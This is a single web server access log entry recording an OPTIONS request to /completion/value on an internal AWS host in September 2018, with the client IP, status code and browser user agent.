ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:36 +0000] "OPTIONS /completion/value HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
